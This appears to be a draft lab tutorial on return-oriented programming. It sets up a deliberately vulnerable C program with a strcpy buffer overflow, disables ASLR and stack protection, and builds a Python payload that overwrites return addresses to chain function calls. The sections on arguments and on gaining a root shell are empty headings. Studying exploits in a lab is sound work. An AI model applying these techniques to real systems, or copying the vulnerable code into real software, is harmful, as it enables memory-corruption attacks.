---
title: "Return-Oriented Programming"
date: 2021-02-04T09:03:22+08:00
draft: true
---

In the previous [post](https://chuang76.github.io/posts/return-to-libc/), we showed how to launch a return-to-libc attack, which chains two functions: system() and exit(). Nergal and Shacham extended the return-to-libc attack in 2001 and 2007, respectively. Return-Oriented Programming (ROP) is a generalized version that chains several code chunks (gadgets) to accomplish the exploit. In this article, we'll study how ROP works.  



## Setup

Environment

1. Google cloud virtual machine: Ubuntu 20.04
2. Linux kernel version: 5.4.0
3. Create a symbolic link from “/bin/zsh” to “/bin/sh” since /bin/dash in most Ubuntu systems prevents itself from being executed in a Set-UID process
4. Disable ASLR and Stackguard protection, but make the stack non-executable (our purpose of the experiment)



## Chain function calls without arguments

We first show how to chain function calls without arguments. Our goal is to invoke the function foo() in the following program 10 times based on our crafted stack frame. 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int bof(char* str)
{
	char buffer[100]; 
	unsigned int* framep; 

	asm("movl %%ebp, %0" : "=r" (framep));             // copy ebp 
	printf("ebp value = 0x%x\n", (unsigned)framep); 
	printf("buffer address = 0x%x\n", (unsigned)buffer); 

	strcpy(buffer, str);                               // buffer overflow 

	return 1; 
}

void foo() {
	static int i = 0; 
	printf("function foo() is called %d times\n", ++i);
}

void helper(int x) {
	printf("helper()'s argument = 0x%x\n", x);
}

int main(int argc, char** argv)
{
	char input[1000]; 
	FILE* badfile; 

	char* shell = getenv("my_shell"); 
	if (shell)
		printf("shell = %s, address = 0x%x\n", shell, (unsigned int)shell); 

	badfile = fopen("badfile", "r"); 
	fread(input, sizeof(char), 1000, badfile); 

	bof(input); 

	printf("return properly\n");
	return 1; 
}
```

According to the discussion in the previous [post](https://chuang76.github.io/posts/return-to-libc/), the stack should looks like this:

[seed5-3]

And we need to find out

1. the address of function foo()
2. the address of function exit()
3. the offset between the address of buffer and the old ebp 

To get the offset, we can execute the program to display the address of buffer and the ebp value. To get where is the address of function foo() and exit(), just set a breakpoint at main function and run the program via gdb debugger. 

[seed5-2]

[seed5-1]

As you can see, we need to cover 0xffffd118 - 0xffffd0a8 + 4 (the size of ebp), which equals to 116 bytes. The address of foo() is 0x565562d0 and the address of exit() is 0xf7e05f80. 

Okay, so now we can write a payload called test1.py as follows.  

```
#!/usr/bin/python3

import sys 

content = bytearray(0xaa for i in range(1000))
foo_addr = 0x565562d0 
exit_addr = 0xf7e05f80
start = 116 

for i in range(0, 10):
    content[start:start + 4] = (foo_addr).to_bytes(4, byteorder='little')
    start += 4
content[start:start + 4] = (exit_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
```

And here is the result, we invoke foo() 10 times successfully. 

[seed5-4]



## Chain function calls with arguments

Let's move on. We start to consider a more complicated situation. That is, we try to allocate the arguments at this time. 



## Exploit

Now, we have understood how ROP works. So how to use the ROP technique to launch an attack and get the root privilege of the shell?